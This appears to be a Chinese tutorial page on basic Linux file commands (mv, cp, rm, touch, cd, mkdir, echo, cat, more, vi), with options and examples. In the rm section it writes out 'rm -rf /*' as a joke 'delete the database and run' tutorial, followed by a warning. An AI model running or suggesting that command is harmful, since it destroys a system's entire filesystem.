<p>mv命令可以用来将源文件移至一个目标文件中，或将一组文件移至一个目标目录中。源文件被移至目标文件有两种不同的结果：</p>
<p>如果目标文件是到某一目录文件的路径，源文件会被移到此目录下，且文件名不变。<br>如果目标文件不是目录文件，则源文件名（只能有一个）会变为此目标文件名，并覆盖己存在的同名文件。如果源文件和目标文件在同一个目录下，mv的作用就是改文件名。当目标文件是目录文件时，源文件或目录参数可以有多个，则所有的源文件都会被移至目标文件中。所有移到该目录下的文件都将保留以前的文件名。<br>注意事项：mv与cp的结果不同，mv好像文件“搬家”，文件个数并未增加。而cp对文件进行复制，文件个数增加了。</p>
<h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">mv</span><span class="params">(选项)</span><span class="params">(参数)</span></span></span><br></pre></td></tr></table></figure>
<h3 id="选项-1"><a href="#选项-1" class="headerlink" title="选项"></a>选项</h3><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">--backup=&lt;备份模式&gt;：若需覆盖文件，则覆盖前先行备份；</span></span><br><span class="line"><span class="deletion">-b：当文件存在时，覆盖前，为其创建一个备份；</span></span><br><span class="line"><span class="deletion">-f：若目标文件或目录与现有的文件或目录重复，则直接覆盖现有的文件或目录；</span></span><br><span class="line"><span class="deletion">-i：交互式操作，覆盖前先行询问用户，如果源文件与目标文件或目标目录中的文件同名，则询问用户是否覆盖目标文件。用户输入”y”，表示将覆盖目标文件；输入”n”，表示取消对源文件的移动。这样可以避免误将文件覆盖。</span></span><br><span class="line"><span class="deletion">--strip-trailing-slashes：删除源文件中的斜杠“/”；</span></span><br><span class="line"><span class="deletion">-S&lt;后缀&gt;：为备份文件指定后缀，而不使用默认的后缀；</span></span><br><span class="line"><span class="deletion">--target-directory=&lt;目录&gt;：指定源文件要移动到目标目录；</span></span><br><span class="line"><span class="deletion">-u：当源文件比目标文件新或者目标文件不存在时，才执行移动操作。</span></span><br></pre></td></tr></table></figure>
<h3 id="参数-1"><a href="#参数-1" class="headerlink" title="参数"></a>参数</h3><p>源文件：源文件列表。<br>目标文件：如果“目标文件”是文件名则在移动文件的同时，将其改名为“目标文件”；如果“目标文件”是目录名则将源文件移动到“目标文件”下。</p>
<h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><p>将文件ex3改名为new1</p>
<figure class="highlight ceylon"><table><tr><td class="code"><pre><span class="line">mv ex<span class="number">3</span> <span class="keyword">new</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>将目录/usr/men中的所有文件移到当前目录（用.表示）中：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">mv <span class="regexp">/usr/m</span>en<span class="regexp">/* .</span></span><br></pre></td></tr></table></figure>
<h2 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a>cp命令</h2><p>cp命令用来将一个或多个源文件或者目录复制到指定的目的文件或目录。它可以将单个源文件复制成一个指定文件名的具体的文件或一个已经存在的目录下。cp命令还支持同时复制多个文件，当一次复制多个文件时，目标文件参数必须是一个已经存在的目录，否则将出现错误。</p>
<h3 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">cp</span><span class="params">(选项)</span><span class="params">(参数)</span></span></span><br></pre></td></tr></table></figure>
<h3 id="选项-2"><a href="#选项-2" class="headerlink" title="选项"></a>选项</h3><figure class="highlight haml"><table><tr><td class="code"><pre><span class="line">-<span class="ruby">a：此参数的效果和同时指定<span class="string">"-dpR"</span>参数相同；</span></span><br><span class="line"><span class="ruby">-d：当复制符号连接时，把目标文件或目录也建立为符号连接，并指向与源文件或目录连接的原始文件或目录；</span></span><br><span class="line"><span class="ruby">-f：强行复制文件或目录，不论目标文件或目录是否已存在；</span></span><br><span class="line"><span class="ruby">-i：覆盖既有文件之前先询问用户；</span></span><br><span class="line"><span class="ruby">-l：对源文件建立硬连接，而非复制文件；</span></span><br><span class="line"><span class="ruby">-p：保留源文件或目录的属性；</span></span><br><span class="line"><span class="ruby">-R/r：递归处理，将指定目录下的所有文件与子目录一并处理；</span></span><br><span class="line"><span class="ruby">-s：对源文件建立符号连接，而非复制文件；</span></span><br><span class="line"><span class="ruby">-u：使用这项参数后只会在源文件的更改时间较目标文件更新时或是名称相互对应的目标文件并不存在时，才复制文件；</span></span><br><span class="line"><span class="ruby">-S：在备份文件时，用指定的后缀“SUFFIX”代替文件的默认后缀；</span></span><br><span class="line"><span class="ruby">-b：覆盖已存在的文件目标前将目标文件备份；</span></span><br><span class="line"><span class="ruby">-v：详细显示命令执行的操作。</span></span><br></pre></td></tr></table></figure>
<h3 id="参数-2"><a href="#参数-2" class="headerlink" title="参数"></a>参数</h3><p>源文件：制定源文件列表。默认情况下，cp命令不能复制目录，如果要复制目录，则必须使用-R选项；<br>目标文件：指定目标文件。当“源文件”为多个文件时，要求“目标文件”为指定的目录。</p>
<h3 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h3><p>如果把一个文件复制到一个目标文件中，而目标文件已经存在，那么，该目标文件的内容将被破坏。此命令中所有参数既可以是绝对路径名，也可以是相对路径名。通常会用到点.或点点..的形式。例如，下面的命令将指定文件复制到当前目录下：</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">cp</span></span> ../mary/homework/<span class="keyword">assign</span> .</span><br></pre></td></tr></table></figure>
<p>所有目标文件指定的目录必须是己经存在的，cp命令不能创建目录。如果没有文件复制的权限，则系统会显示出错信息。</p>
<p>将文件file复制到目录/usr/men/tmp下，并改名为file1</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line">cp <span class="keyword">file</span> <span class="regexp">/usr/m</span>en<span class="regexp">/tmp/</span>file1</span><br></pre></td></tr></table></figure>
<p>将目录/usr/men下的所有文件及其子目录复制到目录/usr/zh中</p>
<figure class="highlight avrasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cp</span> -r /usr/men /usr/<span class="built_in">zh</span></span><br></pre></td></tr></table></figure>
<p>交互式地将目录/usr/men中的以m打头的所有.c文件复制到目录/usr/zh中</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">cp -i <span class="string">/usr/men</span> m*<span class="string">.c</span> <span class="string">/usr/zh</span></span><br></pre></td></tr></table></figure>
<h2 id="rm命令"><a href="#rm命令" class="headerlink" title="rm命令"></a>rm命令</h2><p>rm命令可以删除一个目录中的一个或多个文件或目录，也可以将某个目录及其下属的所有文件及其子目录均删除掉。对于链接文件，只是删除整个链接文件，而原有文件保持不变。</p>
<p><code>注意</code>：使用rm命令要格外小心。<code>因为一旦删除了一个文件，就无法再恢复它</code>。所以，在删除文件之前，最好再看一下文件的内容，确定是否真要删除。rm命令可以用-i选项，这个选项在使用文件扩展名字符删除多个文件时特别有用。使用这个选项，系统会要求你逐一确定是否要删除。这时，必须输入y并按Enter键，才能删除文件。如果仅按Enter键或其他字符，文件不会被删除。</p>
<h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><figure class="highlight erlang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">rm</span> <span class="params">(选项)</span><span class="params">(参数)</span></span></span><br></pre></td></tr></table></figure>
<h3 id="选项-3"><a href="#选项-3" class="headerlink" title="选项"></a>选项</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">-d：直接把欲删除的目录的硬连接数据删除成<span class="number">0</span>，删除该目录；</span><br><span class="line">-f：强制删除文件或目录；</span><br><span class="line">-i：删除已有文件或目录之前先询问用户；</span><br><span class="line">-r或-R：递归处理，将指定目录下的所有文件与子目录一并处理；</span><br><span class="line">--preserve-root：不对根目录进行递归操作；</span><br><span class="line">-v：显示指令的详细执行过程。</span><br></pre></td></tr></table></figure>
<h3 id="参数-3"><a href="#参数-3" class="headerlink" title="参数"></a>参数</h3><p>文件：指定被删除的文件列表，如果参数中含有目录，则必须加上-r或者-R选项。</p>
<h3 id="实例-3"><a href="#实例-3" class="headerlink" title="实例"></a>实例</h3><p>交互式删除当前目录下的文件test和example</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line">rm -i <span class="keyword">test</span> example</span><br><span class="line"><span class="keyword">Remove</span> <span class="keyword">test</span> ?n（不删除文件<span class="keyword">test</span>)</span><br><span class="line"><span class="keyword">Remove</span> example ?y（删除文件example)</span><br></pre></td></tr></table></figure>
<p>删库跑路教程</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">rm</span> -rf /*</span><br></pre></td></tr></table></figure>
<p>不要玩火！！！</p>
<h2 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a>touch命令</h2><p>touch命令有两个功能：一是用于把已存在文件的时间标签更新为系统当前的时间（默认方式），它们的数据将原封不动地保留下来；二是用来创建新的空文件。</p>
<h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">touch</span><span class="params">(选项)</span><span class="params">(参数)</span></span></span><br></pre></td></tr></table></figure>
<h3 id="选项-4"><a href="#选项-4" class="headerlink" title="选项"></a>选项</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">-a：或--<span class="built_in">time</span>=atime或--<span class="built_in">time</span>=access或--<span class="built_in">time</span>=use  只更改存取时间；</span><br><span class="line">-c：或--no-create  不建立任何文件；</span><br><span class="line">-d：&lt;时间日期&gt; 使用指定的日期时间，而非现在的时间；</span><br><span class="line">-f：此参数将忽略不予处理，仅负责解决BSD版本touch指令的兼容性问题；</span><br><span class="line">-m：或--<span class="built_in">time</span>=mtime或--<span class="built_in">time</span>=modify  只更该变动时间；</span><br><span class="line">-r：&lt;参考文件或目录&gt;  把指定文件或目录的日期时间，统统设成和参考文件或目录的日期时间相同；</span><br><span class="line">-t：&lt;日期时间&gt;  使用指定的日期时间，而非现在的时间；</span><br><span class="line">--<span class="built_in">help</span>：在线帮助；</span><br><span class="line">--version：显示版本信息。</span><br></pre></td></tr></table></figure>
<h3 id="参数-4"><a href="#参数-4" class="headerlink" title="参数"></a>参数</h3><p>文件：指定要设置时间属性的文件列表。</p>
<h3 id="实例-4"><a href="#实例-4" class="headerlink" title="实例"></a>实例</h3><figure class="highlight irpf90"><table><tr><td class="code"><pre><span class="line"><span class="keyword">touch</span> ex2</span><br></pre></td></tr></table></figure>
<p>在当前目录下建立一个空文件ex2，然后，利用ls -l命令可以发现文件ex2的大小为0，表示它是空文件。</p>
<h2 id="pwd命令"><a href="#pwd命令" class="headerlink" title="pwd命令"></a>pwd命令</h2><p>pwd命令以绝对路径的方式显示用户当前工作目录。命令将当前目录的全路径名称（从根目录）写入标准输出。全部目录使用/分隔。第一个/表示根目录，最后一个目录是当前目录。执行pwd命令可立刻得知您目前所在的工作目录的绝对路径名称。</p>
<h3 id="语法-5"><a href="#语法-5" class="headerlink" title="语法"></a>语法</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pwd</span>（选项）</span><br></pre></td></tr></table></figure>
<h3 id="选项-5"><a href="#选项-5" class="headerlink" title="选项"></a>选项</h3><figure class="highlight ada"><table><tr><td class="code"><pre><span class="line"><span class="comment">--help：显示帮助信息；</span></span><br><span class="line"><span class="comment">--version：显示版本信息。</span></span><br></pre></td></tr></table></figure>
<h3 id="实例-5"><a href="#实例-5" class="headerlink" title="实例"></a>实例</h3><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line">[root<span class="symbol">@localhost</span> ~]<span class="meta"># pwd</span></span><br><span class="line">/root</span><br></pre></td></tr></table></figure>
<h2 id="cd命令"><a href="#cd命令" class="headerlink" title="cd命令"></a>cd命令</h2><p>cd命令用来切换工作目录至<code>dirname</code>。 其中dirName表示法可为绝对路径或相对路径。若目录名称省略，则变换至使用者的home directory(也就是刚<code>login</code>时所在的目录)。另外，<code>~</code>也表示为home directory的意思，<code>.</code>则是表示目前所在的目录，<code>..</code>则表示目前目录位置的上一层目录。</p>
<h3 id="语法-6"><a href="#语法-6" class="headerlink" title="语法"></a>语法</h3><figure class="highlight erlang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">cd</span> <span class="params">(选项)</span> <span class="params">(参数)</span></span></span><br></pre></td></tr></table></figure>
<h3 id="选项-6"><a href="#选项-6" class="headerlink" title="选项"></a>选项</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">-p 如果要切换到的目标目录是一个符号连接，直接切换到符号连接指向的目标目录</span><br><span class="line">-L 如果要切换的目标目录是一个符号的连接，直接切换到字符连接名代表的目录，而非符号连接所指向的目标目录。</span><br><span class="line">- 当仅实用"-"一个选项时，当前工作目录将被切换到环境变量"OLDPWD"所表示的目录。</span><br></pre></td></tr></table></figure>
<h3 id="实例-6"><a href="#实例-6" class="headerlink" title="实例"></a>实例</h3><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cd</span>    进入用户主目录；</span><br><span class="line"><span class="keyword">cd</span> ~  进入用户主目录；</span><br><span class="line"><span class="keyword">cd</span> -  返回进入此目录之前所在的目录；</span><br><span class="line"><span class="keyword">cd</span> ..  返回上级目录（若当前目录为“/“，则执行完后还在“/<span class="string">"；"</span>..<span class="comment">"为上级目录的意思）；</span></span><br><span class="line"><span class="keyword">cd</span> ../..  返回上两级目录；</span><br><span class="line"><span class="keyword">cd</span> !$  把上个命令的参数作为<span class="keyword">cd</span>参数使用。</span><br></pre></td></tr></table></figure>
<h2 id="mkdir命令"><a href="#mkdir命令" class="headerlink" title="mkdir命令"></a>mkdir命令</h2><p>mkdir命令用来创建目录。该命令创建由dirname命名的目录。如果在目录名的前面没有加任何路径名，则在当前目录下创建由dirname指定的目录；如果给出了一个已经存在的路径，将会在该目录下创建一个指定的目录。在创建目录时，应保证新建的目录与它所在目录下的文件没有重名。 </p>
<p>注意：在创建文件时，不要把所有的文件都存放在主目录中，可以创建子目录，通过它们来更有效地组织文件。最好采用前后一致的命名方式来区分文件和目录。例如，目录名可以以大写字母开头，这样，在目录列表中目录名就出现在前面。</p>
<p>在一个子目录中应包含类型相似或用途相近的文件。例如，应建立一个子目录，它包含所有的数据库文件，另有一个子目录应包含电子表格文件，还有一个子目录应包含文字处理文档，等等。目录也是文件，它们和普通文件一样遵循相同的命名规则，并且利用全路径可以唯一地指定一个目录。</p>
<h3 id="语法-7"><a href="#语法-7" class="headerlink" title="语法"></a>语法</h3><figure class="highlight erlang"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">mkdir</span> <span class="params">(选项)</span><span class="params">(参数)</span></span></span><br></pre></td></tr></table></figure>
<h3 id="选项-7"><a href="#选项-7" class="headerlink" title="选项"></a>选项</h3><figure class="highlight diff"><table><tr><td class="code"><pre><span class="line"><span class="deletion">-Z：设置安全上下文，当使用SELinux时有效；</span></span><br><span class="line"><span class="deletion">-m&lt;目标属性&gt;或--mode&lt;目标属性&gt;建立目录的同时设置目录的权限；</span></span><br><span class="line"><span class="deletion">-p或--parents 若所要建立目录的上层目录目前尚未建立，则会一并建立上层目录；</span></span><br><span class="line"><span class="deletion">--version 显示版本信息。</span></span><br></pre></td></tr></table></figure>
<h3 id="参数-5"><a href="#参数-5" class="headerlink" title="参数"></a>参数</h3><p>目录：指定要创建的目录列表，多个目录之间用空格隔开。</p>
<h3 id="实例-7"><a href="#实例-7" class="headerlink" title="实例"></a>实例</h3><p>在目录/usr/meng下建立子目录test，并且只有文件主有读、写和执行权限，其他人无权访问</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">mkdir</span> -<span class="keyword">m</span> 700 /usr/meng/<span class="keyword">test</span></span><br></pre></td></tr></table></figure>
<p>在当前目录中建立bin和bin下的os_1目录，权限设置为文件主可读、写、执行，同组用户可读和执行，其他用户无权访问</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">mkdir -p-m <span class="number">750</span> bin/os_1</span><br></pre></td></tr></table></figure>
<h2 id="echo命令"><a href="#echo命令" class="headerlink" title="echo命令"></a>echo命令</h2><p>echo命令用于在shell中打印shell变量的值，或者直接输出指定的字符串。linux的echo命令，在shell编程中极为常用, 在终端下打印变量value的时候也是常常用到的，因此有必要了解下echo的用法echo命令的功能是在显示器上显示一段文字，一般起到一个提示的作用。</p>
<h3 id="语法-8"><a href="#语法-8" class="headerlink" title="语法"></a>语法</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">echo</span><span class="params">(选项)</span><span class="params">(参数)</span></span></span><br></pre></td></tr></table></figure>
<h3 id="选项-8"><a href="#选项-8" class="headerlink" title="选项"></a>选项</h3><figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">-e：激活转义字符。</span><br><span class="line">使用-e选项时，若字符串中出现以下字符，则特别加以处理，而不会将它当成一般文字输出：</span><br><span class="line"></span><br><span class="line"><span class="string">\a</span> 发出警告声；</span><br><span class="line"><span class="string">\b</span> 删除前一个字符；</span><br><span class="line"><span class="string">\c</span> 最后不加上换行符号；</span><br><span class="line"><span class="string">\f</span> 换行但光标仍旧停留在原来的位置；</span><br><span class="line"><span class="string">\n</span> 换行且光标移至行首；</span><br><span class="line"><span class="string">\r</span> 光标移至行首，但不换行；</span><br><span class="line"><span class="string">\t</span> 插入tab；</span><br><span class="line"><span class="string">\v</span> 与<span class="string">\f相同；</span></span><br><span class="line"><span class="string">\\</span> 插入<span class="string">\字符；</span></span><br><span class="line"><span class="string">\nnn</span> 插入nnn（八进制）所代表的ASCII字符；</span><br></pre></td></tr></table></figure>
<h3 id="参数-6"><a href="#参数-6" class="headerlink" title="参数"></a>参数</h3><p>变量：指定要打印的变量。</p>
<h3 id="实例-8"><a href="#实例-8" class="headerlink" title="实例"></a>实例</h3><p>用echo命令打印带有色彩的文字：</p>
<p>文字色：</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> -<span class="keyword">e</span> <span class="string">"\e[1;31mThis is red text\e[0m"</span></span><br><span class="line">This <span class="keyword">is</span> <span class="keyword">red</span> text</span><br></pre></td></tr></table></figure>
<p><code>\e[1;31m</code> 将颜色设置为红色<br><code>\e[0m</code> 将颜色重新置回<br>颜色码：重置=0，黑色=30，红色=31，绿色=32，黄色=33，蓝色=34，洋红=35，青色=36，白色=37</p>
<p>背景色：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">"\e[1;42mGreed Background\e[0m"</span></span><br><span class="line">Greed Background</span><br></pre></td></tr></table></figure>
<p>颜色码：重置=0，黑色=40，红色=41，绿色=42，黄色=43，蓝色=44，洋红=45，青色=46，白色=47</p>
<p>文字闪动：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">"\033[37;31;5mMySQL Server Stop...\033[39;49;0m"</span></span><br></pre></td></tr></table></figure>
<p>红色数字处还有其他数字参数：0 关闭所有属性、1 设置高亮度（加粗）、4 下划线、5 闪烁、7 反显、8 消隐</p>
<h2 id="cat命令"><a href="#cat命令" class="headerlink" title="cat命令"></a>cat命令</h2><p>cat命令连接文件并打印到标准输出设备上，cat经常用来显示文件的内容，类似于下的type命令。</p>
<p>注意：当文件较大时，文本在屏幕上迅速闪过（滚屏），用户往往看不清所显示的内容。因此，一般用more等命令分屏显示。为了控制滚屏，可以按Ctrl+S键，停止滚屏；按Ctrl+Q键可以恢复滚屏。按Ctrl+C（中断）键可以终止该命令的执行，并且返回Shell提示符状态。</p>
<h3 id="语法-9"><a href="#语法-9" class="headerlink" title="语法"></a>语法</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">cat</span><span class="params">(选项)</span><span class="params">(参数)</span></span></span><br></pre></td></tr></table></figure>
<h3 id="选项-9"><a href="#选项-9" class="headerlink" title="选项"></a>选项</h3><figure class="highlight haml"><table><tr><td class="code"><pre><span class="line">-<span class="ruby">n或-number：有<span class="number">1</span>开始对所有输出的行数编号；</span></span><br><span class="line"><span class="ruby">-b或--number-nonblank：和-n相似，只不过对于空白行不编号；</span></span><br><span class="line"><span class="ruby">-s或--squeeze-blank：当遇到有连续两行以上的空白行，就代换为一行的空白行；</span></span><br><span class="line"><span class="ruby">-A：显示不可打印字符，行尾显示“$”；</span></span><br><span class="line"><span class="ruby">-e：等价于<span class="string">"-vE"</span>选项；</span></span><br><span class="line"><span class="ruby">-t：等价于<span class="string">"-vT"</span>选项；</span></span><br></pre></td></tr></table></figure>
<h3 id="参数-7"><a href="#参数-7" class="headerlink" title="参数"></a>参数</h3><p>文件列表：指定要连接的文件列表。</p>
<h3 id="实例-9"><a href="#实例-9" class="headerlink" title="实例"></a>实例</h3><p>设ml和m2是当前目录下的两个文件</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">cat</span> m1 （在屏幕上显示文件<span class="keyword">ml</span>的内容）</span><br><span class="line"><span class="keyword">cat</span> m1 m2 （同时显示文件<span class="keyword">ml</span>和m2的内容）</span><br><span class="line"><span class="keyword">cat</span> m1 m2 &gt; <span class="keyword">file</span> （将文件<span class="keyword">ml</span>和m2合并后放入文件<span class="keyword">file</span>中）</span><br></pre></td></tr></table></figure>
<h2 id="more命令"><a href="#more命令" class="headerlink" title="more命令"></a>more命令</h2><p>more命令是一个基于<code>vi</code>编辑器文本过滤器，它以全屏幕的方式按页显示文本文件的内容，支持vi中的关键字定位操作。more名单中内置了若干快捷键，常用的有H（获得帮助信息），Enter（向下翻滚一行），空格（向下滚动一屏），Q（退出命令）。</p>
<p>该命令一次显示一屏文本，满屏后停下来，并且在屏幕的底部出现一个提示信息，给出至今己显示的该文件的百分比：–More–（XX%）可以用下列不同的方法对提示做出回答：</p>
<ul>
<li>按Space键：显示文本的下一屏内容。</li>
<li>按Enier键：只显示文本的下一行内容。</li>
<li>按斜线符|：接着输入一个模式，可以在文本中寻找下一个相匹配的模式。</li>
<li>按H键：显示帮助屏，该屏上有相关的帮助信息。</li>
<li>按B键：显示上一屏内容。</li>
<li>按Q键：退出rnore命令。</li>
</ul>
<h3 id="语法-10"><a href="#语法-10" class="headerlink" title="语法"></a>语法</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">more</span><span class="params">(语法)</span><span class="params">(参数)</span></span></span><br></pre></td></tr></table></figure>
<h3 id="选项-10"><a href="#选项-10" class="headerlink" title="选项"></a>选项</h3><figure class="highlight haml"><table><tr><td class="code"><pre><span class="line">-<span class="ruby">&lt;数字&gt;：指定每屏显示的行数；</span></span><br><span class="line"><span class="ruby">-d：显示“[press space to continue,<span class="string">'q'</span> to quit.]”和“[Press <span class="string">'h'</span> <span class="keyword">for</span> instructions]”；</span></span><br><span class="line"><span class="ruby">-c：不进行滚屏操作。每次刷新这个屏幕；</span></span><br><span class="line"><span class="ruby">-s：将多个空行压缩成一行显示；</span></span><br><span class="line"><span class="ruby">-u：禁止下划线；</span></span><br><span class="line"><span class="ruby">+&lt;数字&gt;：从指定数字的行开始显示。</span></span><br></pre></td></tr></table></figure>
<h3 id="参数-8"><a href="#参数-8" class="headerlink" title="参数"></a>参数</h3><p>文件：指定分页显示内容的文件。</p>
<h3 id="实例-10"><a href="#实例-10" class="headerlink" title="实例"></a>实例</h3><p>显示文件file的内容，但在显示之前先清屏，并且在屏幕的最下方显示完核的百分比。</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">more</span> -dc <span class="keyword">file</span></span><br></pre></td></tr></table></figure>
<p>显示文件file的内容，每10行显示一次，而且在显示之前先清屏。</p>
<figure class="highlight stata"><table><tr><td class="code"><pre><span class="line"><span class="keyword">more</span> -c -10 <span class="keyword">file</span></span><br></pre></td></tr></table></figure>
<h2 id="vi命令"><a href="#vi命令" class="headerlink" title="vi命令"></a>vi命令</h2><p>vi命令是UNIX操作系统和类UNIX操作系统中最通用的全屏幕纯文本编辑器。Linux中的vi编辑器叫vim，它是vi的增强版（vi Improved），与vi编辑器完全兼容，而且实现了很多增强功能。</p>
<p>vi编辑器支持编辑模式和命令模式，编辑模式下可以完成文本的编辑功能，命令模式下可以完成对文件的操作命令，要正确使用vi编辑器就必须熟练掌握着两种模式的切换。默认情况下，打开vi编辑器后自动进入命令模式。从编辑模式切换到命令模式使用“esc”键，从命令模式切换到编辑模式使用“A”、“a”、“O”、“o”、“I”、“i”键。</p>
<p>vi编辑器提供了丰富的内置命令，有些内置命令使用键盘组合键即可完成，有些内置命令则需要以冒号“：”开头输入。常用内置命令如下：</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><span class="line">Ctrl+u：向文件首翻半屏；</span><br><span class="line">Ctrl+d：向文件尾翻半屏；</span><br><span class="line">Ctrl+f：向文件尾翻一屏；</span><br><span class="line">Ctrl+b：向文件首翻一屏；</span><br><span class="line">Esc：从编辑模式切换到命令模式；</span><br><span class="line">ZZ：命令模式下保存当前文件所做的修改后退出vi；</span><br><span class="line"><span class="symbol">:</span>行号：光标跳转到指定行的行首；</span><br><span class="line"><span class="symbol">:</span><span class="variable">$：</span>光标跳转到最后一行的行首；</span><br><span class="line">x或X：删除一个字符，x删除光标后的，而X删除光标前的；</span><br><span class="line">D：删除从当前光标到光标所在行尾的全部字符；</span><br><span class="line">dd：删除光标行正行内容；</span><br><span class="line">ndd：删除当前行及其后n<span class="number">-1</span>行；</span><br><span class="line">nyy：将当前行及其下n行的内容保存到寄存器？中，其中？为一个字母，n为一个数字；</span><br><span class="line">p：粘贴文本操作，用于将缓存区的内容粘贴到当前光标所在位置的下方；</span><br><span class="line">P：粘贴文本操作，用于将缓存区的内容粘贴到当前光标所在位置的上方；</span><br><span class="line">/字符串：文本查找操作，用于从当前光标所在位置开始向文件尾部查找指定字符串的内容，查找的字符串会被加亮显示；</span><br><span class="line">？name：文本查找操作，用于从当前光标所在位置开始向文件头部查找指定字符串的内容，查找的字符串会被加亮显示；</span><br><span class="line">a，bs/F/T：替换文本操作，用于在第a行到第b行之间，将F字符串换成T字符串。其中，“s/”表示进行替换操作；</span><br><span class="line">a：在当前字符后添加文本；</span><br><span class="line">A：在行末添加文本；</span><br><span class="line">i：在当前字符前插入文本；</span><br><span class="line">I：在行首插入文本；</span><br><span class="line">o：在当前行后面插入一空行；</span><br><span class="line">O：在当前行前面插入一空行；</span><br><span class="line"><span class="symbol">:wq</span>：在命令模式下，执行存盘退出操作；</span><br><span class="line"><span class="symbol">:w</span>：在命令模式下，执行存盘操作；</span><br><span class="line"><span class="symbol">:w</span>！：在命令模式下，执行强制存盘操作；</span><br><span class="line"><span class="symbol">:q</span>：在命令模式下，执行退出vi操作；</span><br><span class="line"><span class="symbol">:q</span>！：在命令模式下，执行强制退出vi操作；</span><br><span class="line"><span class="symbol">:e</span>文件名：在命令模式下，打开并编辑指定名称的文件；</span><br><span class="line"><span class="symbol">:n</span>：在命令模式下，如果同时打开多个文件，则继续编辑下一个文件；</span><br><span class="line"><span class="symbol">:f</span>：在命令模式下，用于显示当前的文件名、光标所在行的行号以及显示比例；</span><br><span class="line"><span class="symbol">:set</span> number：在命令模式下，用于在最左端显示行号；</span><br><span class="line"><span class="symbol">:set</span> nonumber：在命令模式下，用于在最左端不显示行号；</span><br></pre></td></tr></table></figure>
<h3 id="语法-11"><a href="#语法-11" class="headerlink" title="语法"></a>语法</h3><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">vi</span><span class="params">(选项)</span><span class="params">(参数)</span></span></span><br></pre></td></tr></table></figure>
<h3 id="选项-11"><a href="#选项-11" class="headerlink" title="选项"></a>选项</h3><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">+&lt;行号&gt;：从指定行号的行开始先是文本内容；</span><br><span class="line">-b：以二进制模式打开文件，用于编辑二进制文件和可执行文件；</span><br><span class="line">-c&lt;指令&gt;：在完成对第一个文件编辑任务后，执行给出的指令；</span><br><span class="line">-d：以diff模式打开文件，当多个文件编辑时，显示文件差异部分；</span><br><span class="line">-l：使用lisp模式，打开“lisp”和“showmatch”；</span><br><span class="line">-m：取消写文件功能，重设“write”选项；</span><br><span class="line">-M：关闭修改功能；</span><br><span class="line">-n：不实用缓存功能；</span><br><span class="line">-o&lt;文件数目&gt;：指定同时打开指定数目的文件；</span><br><span class="line">-R：以只读方式打开文件；</span><br><span class="line">-s：安静模式，不现实指令的任何错误信息。</span><br></pre></td></tr></table></figure>
<h3 id="参数-9"><a href="#参数-9" class="headerlink" title="参数"></a>参数</h3><p>文件列表：指定要编辑的文件列表。多个文件之间使用空格分隔开。</p>
<h3 id="知识扩展"><a href="#知识扩展" class="headerlink" title="知识扩展"></a>知识扩展</h3><p>vi编辑器有三种工作方式：命令方式、输入方式和ex转义方式。通过相应的命令或操作，在这三种工作方式之间可以进行转换。</p>
<h4 id="命令方式"><a href="#命令方式" class="headerlink" title="命令方式"></a>命令方式</h4><p>在Shell提示符后输入命令vi，进入vi编辑器，并处于vi的命令方式。此时，从键盘上输入的任何字符都被作为编辑命令来解释，例如，a(append）表示附加命令，i(insert）表示插入命令，x表示删除字符命令等。如果输入的字符不是vi的合法命令，则机器发出“报警声”，光标不移动。另外，在命令方式下输入的字符（即vi命令）并不在屏幕上显示出来，例如，输入i，屏幕上并无变化，但通过执行i命令，编辑器的工作方式却发生变化：由命令方式变为输入方式。</p>
